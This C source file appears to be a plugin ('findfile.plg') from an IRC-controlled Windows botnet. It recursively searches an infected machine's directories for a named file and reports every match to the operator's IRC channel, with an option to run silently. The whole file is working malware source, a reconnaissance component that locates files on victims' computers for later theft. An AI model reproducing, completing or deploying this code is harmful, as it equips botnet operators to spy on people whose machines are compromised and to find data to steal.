#include "../../headers/includes.h"
#include "../../headers/functions.h"
#include "../../headers/externs.h"

#ifndef NO_FINDFILE

DWORD WINAPI FindFileThread(LPVOID param)
{
	FFIND ffind = *((FFIND *)param);
	FFIND *ffinds = (FFIND *)param;
	ffinds->gotinfo = TRUE;

	char sendbuf[IRCLINE];
	unsigned int numfound = 0;

	if (ffind.dirname[strlen(ffind.dirname)-1] == '\\')
		ffind.dirname[strlen(ffind.dirname)-1] = '\0';

	_snprintf(sendbuf,sizeof(sendbuf),"nzm (findfile.plg) »»  Searching for file: %s.",ffind.filename);
	if (!ffind.silent) irc_privmsg(ffind.sock,ffind.chan,sendbuf,ffind.notice);

	numfound = FindFile(ffind.sock,ffind.chan,ffind.notice,ffind.filename,ffind.dirname,numfound);
	sprintf(sendbuf,"nzm (findfile.plg) »»  Files found: %d.",numfound);
	if (!ffind.silent) irc_privmsg(ffind.sock,ffind.chan,sendbuf,ffind.notice);
	addlog(sendbuf);

	clearthread(ffind.threadnum);

	ExitThread(0);
}

unsigned int FindFile(SOCKET sock, char *chan, BOOL notice, char *filename, char *dirname, unsigned int numfound)
{
	char sendbuf[IRCLINE], tmpPath[MAX_PATH], newPath[MAX_PATH];

	WIN32_FIND_DATA fd;
	HANDLE fh;

	_snprintf(tmpPath, sizeof(tmpPath), "%s\\*", dirname);
	if ((fh = FindFirstFile(tmpPath, &fd)) != INVALID_HANDLE_VALUE)
		do {
			if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
				if (fd.cFileName[0] != '.' || (fd.cFileName[1] && fd.cFileName[1] != '.')) {
					_snprintf(newPath,sizeof(newPath),"%s\\%s", dirname,fd.cFileName);
					numfound = FindFile(sock, chan, notice, filename, newPath, numfound);
				}
			}
		} while (FindNextFile(fh, &fd));
	FindClose(fh);

	_snprintf(tmpPath, sizeof(tmpPath), "%s\\%s", dirname, filename);
	if ((fh = FindFirstFile(tmpPath, &fd)) != INVALID_HANDLE_VALUE)
		do {
			numfound ++;
			_snprintf(sendbuf,sizeof(sendbuf)," Found: %s\\%s",dirname,fd.cFileName);
			irc_privmsg(sock,chan,sendbuf,notice, TRUE);
		} while (FindNextFile(fh, &fd));
	FindClose(fh);

	return (numfound);
}
#endif
